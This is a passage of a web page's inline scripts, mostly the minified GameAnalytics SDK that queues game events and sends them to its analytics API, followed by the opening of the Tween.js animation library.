e-i.timeIntervalSince1970()},n.validateAndFixCurrentDimensions=function(){t.validateDimension01(n.getCurrentCustomDimension01(),n.getAvailableCustomDimensions01())||n.setCustomDimension01(""),t.validateDimension02(n.getCurrentCustomDimension02(),n.getAvailableCustomDimensions02())||n.setCustomDimension02(""),t.validateDimension03(n.getCurrentCustomDimension03(),n.getAvailableCustomDimensions03())||n.setCustomDimension03("")},n}();c.CategorySdkError="sdk_error",c.instance=new c,c.DefaultUserIdKey="default_user_id",c.SessionNumKey="session_num",c.TransactionNumKey="transaction_num",c.FacebookIdKey="facebook_id",c.GenderKey="gender",c.BirthYearKey="birth_year",c.Dimension01Key="dimension01",c.Dimension02Key="dimension02",c.Dimension03Key="dimension03",c.SdkConfigCachedKey="sdk_config_cached",n.GAState=c}(e.state||(e.state={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(n){var t=e.utilities.GAUtilities,i=e.logging.GALogger,r=function(){function e(){}return e.execute=function(n,r,s,o){if(e.countMap[r]||(e.countMap[r]=0),!(e.countMap[r]>=e.MaxCount)){var a=t.getHmac(o,s),u=new XMLHttpRequest;u.onreadystatechange=function(){if(4===u.readyState){if(!u.responseText)return;if(200!=u.status)return void i.w("sdk error failed. response code not 200. status code: "+u.status+", description: "+u.statusText+", body: "+u.responseText);e.countMap[r]=e.countMap[r]+1}},u.open("POST",n,!0),u.setRequestHeader("Content-Type","application/json"),u.setRequestHeader("Authorization",a);try{u.send(s)}catch(e){console.error(e)}}},e}();r.MaxCount=10,r.countMap={},n.SdkErrorTask=r}(e.tasks||(e.tasks={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(n){var t=e.state.GAState,i=e.logging.GALogger,r=e.utilities.GAUtilities,s=e.validators.GAValidator,o=e.tasks.SdkErrorTask,a=function(){function e(){this.protocol="https",this.hostName="api.gameanalytics.com",this.version="v2",this.baseUrl=this.protocol+"://"+this.hostName+"/"+this.version,this.initializeUrlPath="init",this.eventsUrlPath="events",this.useGzip=!1}return e.prototype.requestInit=function(i){var r=t.getGameKey(),s=this.baseUrl+"/"+r+"/"+this.initializeUrlPath,o=t.getInitAnnotations(),a=JSON.stringify(o);if(!a)return void i(n.EGAHTTPApiResponse.JsonEncodeFailed,null);var u=this.createPayloadData(a,this.useGzip),c=[];c.push(a),e.sendRequest(s,u,c,this.useGzip,e.initRequestCallback,i)},e.prototype.sendEventsInArray=function(i,r,s){if(0!=i.length){var o=t.getGameKey(),a=this.baseUrl+"/"+o+"/"+this.eventsUrlPath,u=JSON.stringify(i);if(!u)return void s(n.EGAHTTPApiResponse.JsonEncodeFailed,null,r,i.length);var c=this.createPayloadData(u,this.useGzip),d=[];d.push(u),d.push(r),d.push(i.length.toString()),e.sendRequest(a,c,d,this.useGzip,e.sendEventInArrayRequestCallback,s)}},e.prototype.sendSdkErrorEvent=function(n){var r=t.getGameKey(),a=t.getGameSecret();if(s.validateSdkErrorEvent(r,a,n)){var u=this.baseUrl+"/"+r+"/"+this.eventsUrlPath,c="",d=t.getSdkErrorEventAnnotations(),l=e.sdkErrorTypeToString(n);d.type=l;var f=[];if(f.push(d),!(c=JSON.stringify(f)))return void i.w("sendSdkErrorEvent: JSON encoding failed.");o.execute(u,n,c,a)}},e.sendEventInArrayRequestCallback=function(t,i,r,s){void 0===s&&(s=null);var o=(s[0],s[1],s[2]),a=parseInt(s[3]),u="",c=0;u=t.responseText,c=t.status;var d=e.instance.processRequestResponse(c,t.statusText,u,"Events");if(d!=n.EGAHTTPApiResponse.Ok&&d!=n.EGAHTTPApiResponse.BadRequest)return void r(d,null,o,a);var l=u?JSON.parse(u):{};if(null==l)return void r(n.EGAHTTPApiResponse.JsonDecodeFailed,null,o,a);n.EGAHTTPApiResponse.BadRequest,r(d,l,o,a)},e.sendRequest=function(e,n,i,s,o,a){var u=new XMLHttpRequest,c=t.getGameSecret(),d=r.getHmac(c,n),l=[];l.push(d);for(var f in i)l.push(i[f]);if(u.onreadystatechange=function(){4===u.readyState&&o(u,e,a,l)},u.open("POST",e,!0),u.setRequestHeader("Content-Type","text/plain"),u.setRequestHeader("Authorization",d),s)throw new Error("gzip not supported");try{u.send(n)}catch(e){console.error(e.stack)}},e.initRequestCallback=function(t,i,r,o){void 0===o&&(o=null);var a=(o[0],o[1],""),u=0;a=t.responseText,u=t.status;var c=a?JSON.parse(a):{},d=e.instance.processRequestResponse(u,t.statusText,a,"Init");if(d!=n.EGAHTTPApiResponse.Ok&&d!=n.EGAHTTPApiResponse.BadRequest)return void r(d,null);if(null==c)return void r(n.EGAHTTPApiResponse.JsonDecodeFailed,null);if(d===n.EGAHTTPApiResponse.BadRequest)return void r(d,null);var l=s.validateAndCleanInitRequestResponse(c);if(!l)return void r(n.EGAHTTPApiResponse.BadResponse,null);r(n.EGAHTTPApiResponse.Ok,l)},e.prototype.createPayloadData=function(e,n){if(n)throw new Error("gzip not supported");return e},e.prototype.processRequestResponse=function(e,t,i,r){return i?200===e?n.EGAHTTPApiResponse.Ok:0===e||401===e?n.EGAHTTPApiResponse.Unauthorized:400===e?n.EGAHTTPApiResponse.BadRequest:500===e?n.EGAHTTPApiResponse.InternalServerError:n.EGAHTTPApiResponse.UnknownResponseCode:n.EGAHTTPApiResponse.NoResponse},e.sdkErrorTypeToString=function(e){switch(e){case n.EGASdkErrorType.Rejected:return"rejected";default:return""}},e}();a.instance=new a,n.GAHTTPApi=a}(e.http||(e.http={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(n){var t=e.store.GAStore,i=e.store.EGAStore,r=e.store.EGAStoreArgsOperator,s=e.state.GAState,o=e.logging.GALogger,a=e.utilities.GAUtilities,u=e.http.EGAHTTPApiResponse,c=e.http.GAHTTPApi,d=e.validators.GAValidator,l=e.http.EGASdkErrorType,f=function(){function n(){}return n.addSessionStartEvent=function(){var e={};e.category=n.CategorySessionStart,s.incrementSessionNum(),t.setItem(s.SessionNumKey,s.getSessionNum().toString()),n.addDimensionsToEvent(e),n.addEventToStore(e),o.i("Add SESSION START event"),n.processEvents(n.CategorySessionStart,!1)},n.addSessionEndEvent=function(){var e=s.getSessionStart(),t=s.getClientTsAdjusted(),i=t-e;i<0&&(o.w("Session length was calculated to be less then 0. Should not be possible. Resetting to 0."),i=0);var r={};r.category=n.CategorySessionEnd,r.length=i,n.addDimensionsToEvent(r),n.addEventToStore(r),o.i("Add SESSION END event."),n.processEvents("",!1)},n.addBusinessEvent=function(e,i,r,a,u){if(void 0===u&&(u=null),!d.validateBusinessEvent(e,i,u,r,a))return void c.instance.sendSdkErrorEvent(l.Rejected);var f={};s.incrementTransactionNum(),t.setItem(s.TransactionNumKey,s.getTransactionNum().toString()),f.event_id=r+":"+a,f.category=n.CategoryBusiness,f.currency=e,f.amount=i,f[s.TransactionNumKey]=s.getTransactionNum(),u&&(f.cart_type=u),n.addDimensionsToEvent(f),o.i("Add BUSINESS event: {currency:"+e+", amount:"+i+", itemType:"+r+", itemId:"+a+", cartType:"+u+"}"),n.addEventToStore(f)},n.addResourceEvent=function(t,i,r,a,u){if(!d.validateResourceEvent(t,i,r,a,u,s.getAvailableResourceCurrencies(),s.getAvailableResourceItemTypes()))return void c.instance.sendSdkErrorEvent(l.Rejected);t===e.EGAResourceFlowType.Sink&&(r*=-1);var f={},v=n.resourceFlowTypeToString(t);f.event_id=v+":"+i+":"+a+":"+u,f.category=n.CategoryResource,f.amount=r,n.addDimensionsToEvent(f),o.i("Add RESOURCE event: {currency:"+i+", amount:"+r+", itemType:"+a+", itemId:"+u+"}"),n.addEventToStore(f)},n.addProgressionEvent=function(t,i,r,a,u,f){var v=n.progressionStatusToString(t);if(!d.validateProgressionEvent(t,i,r,a))return void c.instance.sendSdkErrorEvent(l.Rejected);var g,m={};g=r?a?i+":"+r+":"+a:i+":"+r:i,m.category=n.CategoryProgression,m.event_id=v+":"+g;var p=0;f&&t!=e.EGAProgressionStatus.Start&&(m.score=u),t===e.EGAProgressionStatus.Fail&&s.incrementProgressionTries(g),t===e.EGAProgressionStatus.Complete&&(s.incrementProgressionTries(g),p=s.getProgressionTries(g),m.attempt_num=p,s.clearProgressionTries(g)),n.addDimensionsToEvent(m),o.i("Add PROGRESSION event: {status:"+v+", progression01:"+i+", progression02:"+r+", progression03:"+a+", score:"+u+", attempt:"+p+"}"),n.addEventToStore(m)},n.addDesignEvent=function(e,t,i){if(!d.validateDesignEvent(e,t))return void c.instance.sendSdkErrorEvent(l.Rejected);var r={};r.category=n.CategoryDesign,r.event_id=e,i&&(r.value=t),o.i("Add DESIGN event: {eventId:"+e+", value:"+t+"}"),n.addEventToStore(r)},n.addErrorEvent=function(e,t){var i=n.errorSeverityToString(e);if(!d.validateErrorEvent(e,t))return void c.instance.sendSdkErrorEvent(l.Rejected);var r={};r.category=n.CategoryError,r.severity=i,r.message=t,o.i("Add ERROR event: {severity:"+i+", message:"+t+"}"),n.addEventToStore(r)},n.processEvents=function(e,s){try{var u=a.createGuid();s&&(n.cleanupEvents(),n.fixMissingSessionEndEvents());var d=[];d.push(["status",r.Equal,"new"]);var l=[];l.push(["status",r.Equal,"new"]),e&&(d.push(["category",r.Equal,e]),l.push(["category",r.Equal,e]));var f=[];f.push(["status",u]);var v=t.select(i.Events,d);if(!v||0==v.length)return void o.i("Event queue: No events to send");if(v.length>n.MaxEventCount){if(!(v=t.select(i.Events,d,!0,n.MaxEventCount)))return;var g=v[v.length-1],m=g.client_ts;if(d.push(["client_ts",r.LessOrEqual,m]),!(v=t.select(i.Events,d)))return;l.push(["client_ts",r.LessOrEqual,m])}if(o.i("Event queue: Sending "+v.length+" events."),!t.update(i.Events,f,l))return;for(var p=[],h=0;h<v.length;++h){var y=v[h],S=JSON.parse(a.decode64(y.event));0!=S.length&&p.push(S)}c.instance.sendEventsInArray(p,u,n.processEventsCallback)}catch(e){o.e("Error during ProcessEvents(): "+e.stack)}},n.processEventsCallback=function(e,s,a,c){var d=[];if(d.push(["status",r.Equal,a]),e===u.Ok)t.delete(i.Events,d),o.i("Event queue: "+c+" events sent.");else if(e===u.NoResponse){var l=[];l.push(["status","new"]),o.w("Event queue: Failed to send events to collector - Retrying next time"),t.update(i.Events,l,d)}else{if(s){var f,v=0;for(var g in s)0==v&&(f=s[g]),++v;e===u.BadRequest&&f.constructor===Array?o.w("Event queue: "+c+" events sent. "+v+" events failed GA server validation."):o.w("Event queue: Failed to send events.")}else o.w("Event queue: Failed to send events.");t.delete(i.Events,d)}n.updateSessionStore()},n.cleanupEvents=function(){t.update(i.Events,[["status","new"]])},n.fixMissingSessionEndEvents=function(){var e=[];e.push(["session_id",r.NotEqual,s.getSessionId()]);var u=t.select(i.Sessions,e);if(u&&0!=u.length){o.i(u.length+" session(s) located with missing session_end event.");for(var c=0;c<u.length;++c){var d=JSON.parse(a.decode64(u[c].event)),l=d.client_ts,f=u[c].timestamp,v=l-f;v=Math.max(0,v),d.category=n.CategorySessionEnd,d.length=v,n.addEventToStore(d)}}},n.addEventToStore=function(e){if(!s.isInitialized())return void o.w("Could not add event: SDK is not initialized");try{if(t.isStoreTooLargeForEvents()&&!a.stringMatch(e.category,/^(user|session_end|business)$/))return void o.w("Database too large. Event has been blocked.");var u=s.getEventAnnotations(),c=a.encode64(JSON.stringify(u));for(var d in e)u[d]=e[d];var l=JSON.stringify(u);o.ii("Event added to queue: "+l);var f={};f.status="new",f.category=u.category,f.session_id=u.session_id,f.client_ts=u.client_ts,f.event=a.encode64(JSON.stringify(u)),t.insert(i.Events,f),e.category==n.CategorySessionEnd?t.delete(i.Sessions,[["session_id",r.Equal,u.session_id]]):(f={},f.session_id=u.session_id,f.timestamp=s.getSessionStart(),f.event=c,t.insert(i.Sessions,f,!0,"session_id")),t.isStorageAvailable()&&t.save()}catch(d){o.e("addEventToStore: error"),o.e(d.stack)}},n.updateSessionStore=function(){if(s.sessionIsStarted()){var e={};e.session_id=s.instance.sessionId,e.timestamp=s.getSessionStart(),e.event=a.encode64(JSON.stringify(s.getEventAnnotations())),t.insert(i.Sessions,e,!0,"session_id"),t.isStorageAvailable()&&t.save()}},n.addDimensionsToEvent=function(e){e&&(s.getCurrentCustomDimension01()&&(e.custom_01=s.getCurrentCustomDimension01()),s.getCurrentCustomDimension02()&&(e.custom_02=s.getCurrentCustomDimension02()),s.getCurrentCustomDimension03()&&(e.custom_03=s.getCurrentCustomDimension03()))},n.resourceFlowTypeToString=function(n){return n==e.EGAResourceFlowType.Source||n==e.EGAResourceFlowType[e.EGAResourceFlowType.Source]?"Source":n==e.EGAResourceFlowType.Sink||n==e.EGAResourceFlowType[e.EGAResourceFlowType.Sink]?"Sink":""},n.progressionStatusToString=function(n){return n==e.EGAProgressionStatus.Start||n==e.EGAProgressionStatus[e.EGAProgressionStatus.Start]?"Start":n==e.EGAProgressionStatus.Complete||n==e.EGAProgressionStatus[e.EGAProgressionStatus.Complete]?"Complete":n==e.EGAProgressionStatus.Fail||n==e.EGAProgressionStatus[e.EGAProgressionStatus.Fail]?"Fail":""},n.errorSeverityToString=function(n){return n==e.EGAErrorSeverity.Debug||n==e.EGAErrorSeverity[e.EGAErrorSeverity.Debug]?"debug":n==e.EGAErrorSeverity.Info||n==e.EGAErrorSeverity[e.EGAErrorSeverity.Info]?"info":n==e.EGAErrorSeverity.Warning||n==e.EGAErrorSeverity[e.EGAErrorSeverity.Warning]?"warning":n==e.EGAErrorSeverity.Error||n==e.EGAErrorSeverity[e.EGAErrorSeverity.Error]?"error":n==e.EGAErrorSeverity.Critical||n==e.EGAErrorSeverity[e.EGAErrorSeverity.Critical]?"critical":""},n}();f.instance=new f,f.CategorySessionStart="user",f.CategorySessionEnd="session_end",f.CategoryDesign="design",f.CategoryBusiness="business",f.CategoryProgression="progression",f.CategoryResource="resource",f.CategoryError="error",f.MaxEventCount=500,n.GAEvents=f}(e.events||(e.events={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(n){var t=e.logging.GALogger,i=e.state.GAState,r=e.events.GAEvents,s=function(){function e(){this.blocks=new n.PriorityQueue({compare:function(e,n){return e-n}}),this.id2TimedBlockMap={},e.startThread()}return e.createTimedBlock=function(e){void 0===e&&(e=0);var t=new Date;return t.setSeconds(t.getSeconds()+e),new n.TimedBlock(t)},e.performTaskOnGAThread=function(t,i){void 0===i&&(i=0);var r=new Date;r.setSeconds(r.getSeconds()+i);var s=new n.TimedBlock(r);s.block=t,e.instance.id2TimedBlockMap[s.id]=s,e.instance.addTimedBlock(s)},e.performTimedBlockOnGAThread=function(n){e.instance.id2TimedBlockMap[n.id]=n,e.instance.addTimedBlock(n)},e.scheduleTimer=function(t,i){var r=new Date;r.setSeconds(r.getSeconds()+t);var s=new n.TimedBlock(r);return s.block=i,e.instance.id2TimedBlockMap[s.id]=s,e.instance.addTimedBlock(s),s.id},e.getTimedBlockById=function(n){return n in e.instance.id2TimedBlockMap?e.instance.id2TimedBlockMap[n]:null},e.ensureEventQueueIsRunning=function(){e.instance.keepRunning=!0,e.instance.isRunning||(e.instance.isRunning=!0,e.scheduleTimer(e.ProcessEventsIntervalInSeconds,e.processEventQueue))},e.endSessionAndStopQueue=function(){i.isInitialized()&&(t.i("Ending session."),e.stopEventQueue(),i.isEnabled()&&i.sessionIsStarted()&&(r.addSessionEndEvent(),i.instance.sessionStart=0))},e.stopEventQueue=function(){e.instance.keepRunning=!1},e.ignoreTimer=function(n){n in e.instance.id2TimedBlockMap&&(e.instance.id2TimedBlockMap[n].ignore=!0)},e.setEventProcessInterval=function(n){n>0&&(e.ProcessEventsIntervalInSeconds=n)},e.prototype.addTimedBlock=function(e){this.blocks.enqueue(e.deadline.getTime(),e)},e.run=function(){clearTimeout(e.runTimeoutId);try{for(var n;n=e.getNextBlock();)if(!n.ignore)if(n.async){if(!n.running){n.running=!0,n.block();break}}else n.block();return void(e.runTimeoutId=setTimeout(e.run,e.ThreadWaitTimeInMs))}catch(e){t.e("Error on GA thread"),t.e(e.stack)}},e.startThread=function(){e.runTimeoutId=setTimeout(e.run,0)},e.getNextBlock=function(){var n=new Date;return e.instance.blocks.hasItems()&&e.instance.blocks.peek().deadline.getTime()<=n.getTime()?e.instance.blocks.peek().async&&e.instance.blocks.peek().running?e.instance.blocks.peek():e.instance.blocks.dequeue():null},e.processEventQueue=function(){r.processEvents("",!0),e.instance.keepRunning?e.scheduleTimer(e.ProcessEventsIntervalInSeconds,e.processEventQueue):e.instance.isRunning=!1},e}();s.instance=new s,s.ThreadWaitTimeInMs=1e3,s.ProcessEventsIntervalInSeconds=8,n.GAThreading=s}(e.threading||(e.threading={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){var n=e.threading.GAThreading,t=e.logging.GALogger,i=e.store.GAStore,r=e.state.GAState,s=e.http.GAHTTPApi,o=e.device.GADevice,a=e.validators.GAValidator,u=e.http.EGAHTTPApiResponse,c=e.utilities.GAUtilities,d=e.events.GAEvents,l=function(){function l(){}return l.init=function(){if(o.touch(),l.methodMap.configureAvailableCustomDimensions01=l.configureAvailableCustomDimensions01,l.methodMap.configureAvailableCustomDimensions02=l.configureAvailableCustomDimensions02,l.methodMap.configureAvailableCustomDimensions03=l.configureAvailableCustomDimensions03,l.methodMap.configureAvailableResourceCurrencies=l.configureAvailableResourceCurrencies,l.methodMap.configureAvailableResourceItemTypes=l.configureAvailableResourceItemTypes,l.methodMap.configureBuild=l.configureBuild,l.methodMap.configureSdkGameEngineVersion=l.configureSdkGameEngineVersion,l.methodMap.configureGameEngineVersion=l.configureGameEngineVersion,l.methodMap.configureUserId=l.configureUserId,l.methodMap.initialize=l.initialize,l.methodMap.addBusinessEvent=l.addBusinessEvent,l.methodMap.addResourceEvent=l.addResourceEvent,l.methodMap.addProgressionEvent=l.addProgressionEvent,l.methodMap.addDesignEvent=l.addDesignEvent,l.methodMap.addErrorEvent=l.addErrorEvent,l.methodMap.addErrorEvent=l.addErrorEvent,l.methodMap.setEnabledInfoLog=l.setEnabledInfoLog,l.methodMap.setEnabledVerboseLog=l.setEnabledVerboseLog,l.methodMap.setEnabledManualSessionHandling=l.setEnabledManualSessionHandling,l.methodMap.setCustomDimension01=l.setCustomDimension01,l.methodMap.setCustomDimension02=l.setCustomDimension02,l.methodMap.setCustomDimension03=l.setCustomDimension03,l.methodMap.setFacebookId=l.setFacebookId,l.methodMap.setGender=l.setGender,l.methodMap.setBirthYear=l.setBirthYear,l.methodMap.setEventProcessInterval=l.setEventProcessInterval,l.methodMap.startSession=l.startSession,l.methodMap.endSession=l.endSession,l.methodMap.onStop=l.onStop,l.methodMap.onResume=l.onResume,"undefined"!=typeof window&&void 0!==window.GameAnalytics&&void 0!==window.GameAnalytics.q){var e=window.GameAnalytics.q;for(var n in e)l.gaCommand.apply(null,e[n])}},l.gaCommand=function(){for(var n=[],t=0;t<arguments.length;t++)n[t]=arguments[t];n.length>0&&n[0]in e.GameAnalytics.methodMap&&(n.length>1?e.GameAnalytics.methodMap[n[0]].apply(null,Array.prototype.slice.call(n,1)):e.GameAnalytics.methodMap[n[0]]())},l.configureAvailableCustomDimensions01=function(e){void 0===e&&(e=[]),n.performTaskOnGAThread(function(){if(l.isSdkReady(!0,!1))return void t.w("Available custom dimensions must be set before SDK is initialized");r.setAvailableCustomDimensions01(e)})},l.configureAvailableCustomDimensions02=function(e){void 0===e&&(e=[]),n.performTaskOnGAThread(function(){if(l.isSdkReady(!0,!1))return void t.w("Available custom dimensions must be set before SDK is initialized");r.setAvailableCustomDimensions02(e)})},l.configureAvailableCustomDimensions03=function(e){void 0===e&&(e=[]),n.performTaskOnGAThread(function(){if(l.isSdkReady(!0,!1))return void t.w("Available custom dimensions must be set before SDK is initialized");r.setAvailableCustomDimensions03(e)})},l.configureAvailableResourceCurrencies=function(e){void 0===e&&(e=[]),n.performTaskOnGAThread(function(){if(l.isSdkReady(!0,!1))return void t.w("Available resource currencies must be set before SDK is initialized");r.setAvailableResourceCurrencies(e)})},l.configureAvailableResourceItemTypes=function(e){void 0===e&&(e=[]),n.performTaskOnGAThread(function(){if(l.isSdkReady(!0,!1))return void t.w("Available resource item types must be set before SDK is initialized");r.setAvailableResourceItemTypes(e)})},l.configureBuild=function(e){void 0===e&&(e=""),n.performTaskOnGAThread(function(){return l.isSdkReady(!0,!1)?void t.w("Build version must be set before SDK is initialized."):a.validateBuild(e)?void r.setBuild(e):void t.i("Validation fail - configure build: Cannot be null, empty or above 32 length. String: "+e)})},l.configureSdkGameEngineVersion=function(e){void 0===e&&(e=""),n.performTaskOnGAThread(function(){if(!l.isSdkReady(!0,!1))return a.validateSdkWrapperVersion(e)?void(o.sdkGameEngineVersion=e):void t.i("Validation fail - configure sdk version: Sdk version not supported. String: "+e)})},l.configureGameEngineVersion=function(e){void 0===e&&(e=""),n.performTaskOnGAThread(function(){if(!l.isSdkReady(!0,!1))return a.validateEngineVersion(e)?void(o.gameEngineVersion=e):void t.i("Validation fail - configure game engine version: Game engine version not supported. String: "+e)})},l.configureUserId=function(e){void 0===e&&(e=""),n.performTaskOnGAThread(function(){return l.isSdkReady(!0,!1)?void t.w("A custom user id must be set before SDK is initialized."):a.validateUserId(e)?void r.setUserId(e):void t.i("Validation fail - configure user_id: Cannot be null, empty or above 64 length. Will use default user_id method. Used string: "+e)})},l.initialize=function(e,i){void 0===e&&(e=""),void 0===i&&(i=""),o.updateConnectionType();var s=n.createTimedBlock();s.async=!0,l.initTimedBlockId=s.id,s.block=function(){return l.isSdkReady(!0,!1)?void t.w("SDK already initialized. Can only be called once."):a.validateKeys(e,i)?(r.setKeys(e,i),void l.internalInitialize()):void t.w("SDK failed initialize. Game key or secret key is invalid. Can only contain characters A-z 0-9, gameKey is 32 length, gameSecret is 40 length. Failed keys - gameKey: "+e+", secretKey: "+i)},n.performTimedBlockOnGAThread(s)},l.addBusinessEvent=function(e,t,i,r,s){void 0===e&&(e=""),void 0===t&&(t=0),void 0===i&&(i=""),void 0===r&&(r=""),void 0===s&&(s=""),o.updateConnectionType(),n.performTaskOnGAThread(function(){l.isSdkReady(!0,!0,"Could not add business event")&&d.addBusinessEvent(e,t,i,r,s)})},l.addResourceEvent=function(t,i,r,s,a){void 0===t&&(t=e.EGAResourceFlowType.Undefined),void 0===i&&(i=""),void 0===r&&(r=0),void 0===s&&(s=""),void 0===a&&(a=""),o.updateConnectionType(),n.performTaskOnGAThread(function(){l.isSdkReady(!0,!0,"Could not add resource event")&&d.addResourceEvent(t,i,r,s,a)})},l.addProgressionEvent=function(t,i,r,s,a){void 0===t&&(t=e.EGAProgressionStatus.Undefined),void 0===i&&(i=""),void 0===r&&(r=""),void 0===s&&(s=""),o.updateConnectionType(),n.performTaskOnGAThread(function(){if(l.isSdkReady(!0,!0,"Could not add progression event")){var e=void 0!==a;d.addProgressionEvent(t,i,r,s,e?a:0,e)}})},l.addDesignEvent=function(e,t){o.updateConnectionType(),n.performTaskOnGAThread(function(){if(l.isSdkReady(!0,!0,"Could not add design event")){var n=void 0!==t;d.addDesignEvent(e,n?t:0,n)}})},l.addErrorEvent=function(t,i){void 0===t&&(t=e.EGAErrorSeverity.Undefined),void 0===i&&(i=""),o.updateConnectionType(),n.performTaskOnGAThread(function(){l.isSdkReady(!0,!0,"Could not add error event")&&d.addErrorEvent(t,i)})},l.setEnabledInfoLog=function(e){void 0===e&&(e=!1),n.performTaskOnGAThread(function(){e?(t.setInfoLog(e),t.i("Info logging enabled")):(t.i("Info logging disabled"),t.setInfoLog(e))})},l.setEnabledVerboseLog=function(e){void 0===e&&(e=!1),n.performTaskOnGAThread(function(){e?(t.setVerboseLog(e),t.i("Verbose logging enabled")):(t.i("Verbose logging disabled"),t.setVerboseLog(e))})},l.setEnabledManualSessionHandling=function(e){void 0===e&&(e=!1),n.performTaskOnGAThread(function(){r.setManualSessionHandling(e)})},l.setCustomDimension01=function(e){void 0===e&&(e=""),n.performTaskOnGAThread(function(){if(!a.validateDimension01(e,r.getAvailableCustomDimensions01()))return void t.w("Could not set custom01 dimension value to '"+e+"'. Value not found in available custom01 dimension values");r.setCustomDimension01(e)})},l.setCustomDimension02=function(e){void 0===e&&(e=""),n.performTaskOnGAThread(function(){if(!a.validateDimension02(e,r.getAvailableCustomDimensions02()))return void t.w("Could not set custom02 dimension value to '"+e+"'. Value not found in available custom02 dimension values");r.setCustomDimension02(e)})},l.setCustomDimension03=function(e){void 0===e&&(e=""),n.performTaskOnGAThread(function(){if(!a.validateDimension03(e,r.getAvailableCustomDimensions03()))return void t.w("Could not set custom03 dimension value to '"+e+"'. Value not found in available custom03 dimension values");r.setCustomDimension03(e)})},l.setFacebookId=function(e){void 0===e&&(e=""),n.performTaskOnGAThread(function(){a.validateFacebookId(e)&&r.setFacebookId(e)})},l.setGender=function(t){void 0===t&&(t=e.EGAGender.Undefined),n.performTaskOnGAThread(function(){a.validateGender(t)&&r.setGender(t)})},l.setBirthYear=function(e){void 0===e&&(e=0),n.performTaskOnGAThread(function(){a.validateBirthyear(e)&&r.setBirthYear(e)})},l.setEventProcessInterval=function(e){n.performTaskOnGAThread(function(){n.setEventProcessInterval(e)})},l.startSession=function(){if(r.getUseManualSessionHandling()){if(!r.isInitialized())return;var e=n.createTimedBlock();e.async=!0,l.initTimedBlockId=e.id,e.block=function(){r.isEnabled()&&r.sessionIsStarted()&&n.endSessionAndStopQueue(),l.resumeSessionAndStartQueue()},n.performTimedBlockOnGAThread(e)}},l.endSession=function(){r.getUseManualSessionHandling()&&l.onStop()},l.onStop=function(){n.performTaskOnGAThread(function(){try{n.endSessionAndStopQueue()}catch(e){}})},l.onResume=function(){var e=n.createTimedBlock();e.async=!0,l.initTimedBlockId=e.id,e.block=function(){l.resumeSessionAndStartQueue()},n.performTimedBlockOnGAThread(e)},l.internalInitialize=function(){r.ensurePersistedStates(),i.setItem(r.DefaultUserIdKey,r.getDefaultId()),r.setInitialized(!0),l.newSession(),r.isEnabled()&&n.ensureEventQueueIsRunning()},l.newSession=function(){t.i("Starting a new session."),r.validateAndFixCurrentDimensions(),s.instance.requestInit(l.startNewSessionCallback)},l.startNewSessionCallback=function(e,s){if(e===u.Ok&&s){var o=0;if(s.server_ts){var a=s.server_ts;o=r.calculateServerTimeOffset(a)}s.time_offset=o,i.setItem(r.SdkConfigCachedKey,c.encode64(JSON.stringify(s))),r.instance.sdkConfigCached=s,r.instance.sdkConfig=s,r.instance.initAuthorized=!0}else e==u.Unauthorized?(t.w("Initialize SDK failed - Unauthorized"),r.instance.initAuthorized=!1):(e===u.NoResponse||e===u.RequestTimeout?t.i("Init call (session start) failed - no response. Could be offline or timeout."):e===u.BadResponse||e===u.JsonEncodeFailed||e===u.JsonDecodeFailed?t.i("Init call (session start) failed - bad response. Could be bad response from proxy or GA servers."):e!==u.BadRequest&&e!==u.UnknownResponseCode||t.i("Init call (session start) failed - bad request or unknown response."),null==r.instance.sdkConfig?null!=r.instance.sdkConfigCached?(t.i("Init call (session start) failed - using cached init values."),r.instance.sdkConfig=r.instance.sdkConfigCached):(t.i("Init call (session start) failed - using default init values."),
r.instance.sdkConfig=r.instance.sdkConfigDefault):t.i("Init call (session start) failed - using cached init values."),r.instance.initAuthorized=!0);if(r.instance.clientServerTimeOffset=r.instance.sdkConfig.time_offset?r.instance.sdkConfig.time_offset:0,!r.isEnabled())return t.w("Could not start session: SDK is disabled."),void n.stopEventQueue();n.ensureEventQueueIsRunning();var f=c.createGuid();r.instance.sessionId=f,r.instance.sessionStart=r.getClientTsAdjusted(),d.addSessionStartEvent();var v=n.getTimedBlockById(l.initTimedBlockId);null!=v&&(v.running=!1),l.initTimedBlockId=-1},l.resumeSessionAndStartQueue=function(){r.isInitialized()&&(t.i("Resuming session."),r.sessionIsStarted()||l.newSession())},l.isSdkReady=function(e,n,i){return void 0===n&&(n=!0),void 0===i&&(i=""),i&&(i+=": "),e&&!r.isInitialized()?(n&&t.w(i+"SDK is not initialized"),!1):!(e&&!r.isEnabled())||(n&&t.w(i+"SDK is disabled"),!1)},l}();l.initTimedBlockId=-1,l.methodMap={},e.GameAnalytics=l}(gameanalytics||(gameanalytics={})),gameanalytics.GameAnalytics.init();var GameAnalytics=gameanalytics.GameAnalytics.gaCommand;
scope.gameanalytics=gameanalytics;
scope.GameAnalytics=GameAnalytics;
})(this);</script>
	<script>/**
 * Tween.js - Licensed under the MIT license
 * https://github.com/tweenjs/tween.js
 * ----------------------------------------------
 *
 * See https://github.com/tweenjs/tween.js/graphs/contributors for the full list of contributors.
 * Thank you all, you're awesome!
 */

var TWEEN = TWEEN || (function () {

	var _tweens = [];

	return {

		getAll: function () {

			return _tweens;

		},

		removeAll: function () {

			_tweens = [];

		},

		add: function (tween) {

			_tweens.push(tween);

		},

		remove: function (tween) {

			var i = _tweens.indexOf(tween);

			if (i !== -1) {
				_tweens.splice(i, 1);
			}

		},

		update: function (time, preserve) {

			if (_tweens.length === 0) {
				return false;
			}

			var i = 0;

			time = time !== undefined ? time : TWEEN.now();

			while (i < _tweens.length) {

				if (_tweens[i].update(time) || preserve) {
					i++;
				} else {
					_tweens.splice(i, 1);
				}

			}

			return true;

		}
	};

})();


// Include a performance.now polyfill.
// In node.js, use process.hrtime.
if (typeof (window) === 'undefined' && typeof (process) !== 'undefined') {
	TWEEN.now = function () {
		var time = process.hrtime();

		// Convert [seconds, nanoseconds] to milliseconds.
		return time[0] * 1000 + time[1] / 1000000;
	};
}
// In a browser, use window.performance.now if it is available.
else if (typeof (window) !== 'undefined' &&
         window.performance !== undefined &&
		 window.performance.now !== undefined) {
	// This must be bound, because directly assigning this function
	// leads to an invocation exception in Chrome.
	TWEEN.now = window.performance.now.bind(window.performance);
}
// Use Date.now if it is available.
else if (Date.now !== undefined) {
	TWEEN.now = Date.now;
}
